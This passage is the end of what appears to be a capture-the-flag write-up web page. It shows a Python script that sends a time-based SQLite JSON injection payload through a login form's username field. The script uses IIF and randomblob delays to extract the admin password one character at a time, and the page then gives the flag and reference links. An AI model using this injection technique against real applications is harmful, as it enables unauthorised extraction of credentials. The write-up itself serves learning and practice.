            payload = f&#34;admin.username\&#34;) as a,   json_extract(users, &#39;$.admin.username&#39;) as b,   json_extract(users, &#39;$.admin.password&#39;) as c FROM db  WHERE    b = &#39;admin&#39;    AND IIF(substr(c, 1, {i + 1}) = &#39;{flag + string}&#39;, (SELECT randomblob(1000000000 % 10) FROM sqlite_master WHERE 1 LIMIT 1), 1); -- # &#34;

            # payload = &#34;admin.username\&#34;) as a,   json_extract(users, &#39;$.admin.username&#39;) as b,   json_extract(users, &#39;$.admin.password&#39;) as c FROM db  WHERE    b = &#39;admin&#39;    AND IIF(length(c) = 27, (SELECT randomblob(1000000000 % 10) FROM sqlite_master WHERE 1 LIMIT 1), 1); -- # &#34;
            
            # print(payload)

            try:
                r = post(url=url, data={&#34;username&#34; : payload, &#34;password&#34; : &#34;guest&#34;})
            except:
                flag += string
                print(flag)
                break
print(flag)
</code></pre><p>Flag: <code>FLAG{sqlite_js0n_inject!on}</code></p><h2 id=reference>Reference
<a class=anchor href=#reference>#</a></h2><p><a href=https://chat.openai.com/share/fcca9a7d-234d-4a38-9de8-0aa19f1af101>ChatGPT - SQL Syntax Questions</a>
<a href=https://chat.openai.com/share/27a4119a-b798-403f-b6a6-ab3963309a09>ChatGPT - Timed Based Questions</a>
<a href=https://www.sqlitetutorial.net/sqlite-functions/sqlite-iif/>Overview of SQLite IIF() function</a></p></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#background>Background</a></li><li><a href=#source-code>Source code</a></li><li><a href=#recon>Recon</a></li><li><a href=#exploit---time-based-sqli>Exploit - Time Based SQLi</a></li><li><a href=#reference>Reference</a></li></ul></nav></div></aside></main></body></html>